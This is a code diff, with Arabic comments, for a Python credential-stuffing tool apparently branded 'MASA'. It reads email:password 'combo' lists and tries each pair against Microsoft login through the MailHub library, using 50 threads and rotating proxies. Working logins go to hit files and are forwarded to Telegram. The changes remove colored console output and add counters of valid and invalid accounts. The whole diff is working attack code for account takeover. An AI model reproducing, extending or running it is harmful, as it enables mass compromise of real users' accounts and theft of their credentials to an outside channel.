@@ -5,11 +5,6 @@ import requests
 from mailhub import MailHub
 from concurrent.futures import ThreadPoolExecutor
 import os
-from colorama import Fore, Style
-
-# تهيئة مكتبة colorama
-from colorama import init
-init(autoreset=True)
 
 # عرض الشعار
 logo = pyfiglet.figlet_format('MASA')
@@ -31,21 +26,23 @@ def validate_line(line):
         return None, None
 
 # دالة لمحاولة تسجيل الدخول
-def attempt_login(email, password, proxy, hits_file, local_hits_file):
+def attempt_login(email, password, proxy, hits_file, local_hits_file, counters):
     try:
         res = mail.loginMICROSOFT(email, password, proxy)[0]
         if res == "ok":
-            print(f"{Fore.GREEN}Valid   | {email}:{password}{Style.RESET_ALL}")
+            print(f"Valid   | {email}:{password}")
             with write_lock:
                 hits_file.write(f"{email}:{password}\n")
                 hits_file.flush()
                 local_hits_file.write(f"{email}:{password}\n")
                 local_hits_file.flush()
-                send_to_telegram(email, password)  
+                send_to_telegram(email, password)
+            counters['valid'] += 1  # زيادة العداد للحسابات الصالحة
         else:
-            print(f"{Fore.RED}Invalid | {email}:{password}{Style.RESET_ALL}")
+            print(f"Invalid | {email}:{password}")
+            counters['invalid'] += 1  # زيادة العداد للحسابات غير الصالحة
     except Exception as e:
-        print(f"{Fore.YELLOW}Error logging in {email}:{password} - {str(e)}{Style.RESET_ALL}")
+        print(f"Error logging in {email}:{password} - {str(e)}")
 
 # دالة لإرسال رسالة إلى تيليجرام
 def send_to_telegram(email, password):
@@ -70,6 +67,7 @@ Valid Acc : {email}:{password}
 
 # دالة لمعالجة ملف الكومبو
 def process_combo_file(hits_file, local_hits_file, proxies, combo_path):
+    counters = {'valid': 0, 'invalid': 0}  # عدادات للحسابات الصالحة وغير الصالحة
     try:
         with open(combo_path, "r") as file:
             with ThreadPoolExecutor(max_workers=50) as executor:
@@ -77,14 +75,18 @@ def process_combo_file(hits_file, local_hits_file, proxies, combo_path):
                 for line in file:
                     email, password = validate_line(line)
                     if email is None or password is None:
-                        print(f"{Fore.YELLOW}Invalid format in line: {line.strip()}{Style.RESET_ALL}")
+                        print(f"Invalid format in line: {line.strip()}")
                         continue
                     proxy = {"http": f"http://{random.choice(proxies).strip()}"} if proxies else None
-                    futures.append(executor.submit(attempt_login, email, password, proxy, hits_file, local_hits_file))
+                    futures.append(executor.submit(attempt_login, email, password, proxy, hits_file, local_hits_file, counters))
                 for future in futures:
                     future.result()
     except Exception as e:
-        print(f"{Fore.RED}Error processing combo file: {e}{Style.RESET_ALL}")
+        print(f"Error processing combo file: {e}")
+    
+    # عرض النتائج النهائية
+    print(f"\nTotal Valid Accounts: {counters['valid']}")
+    print(f"Total Invalid Accounts: {counters['invalid']}")
 
 # الدالة الرئيسية
 def main():
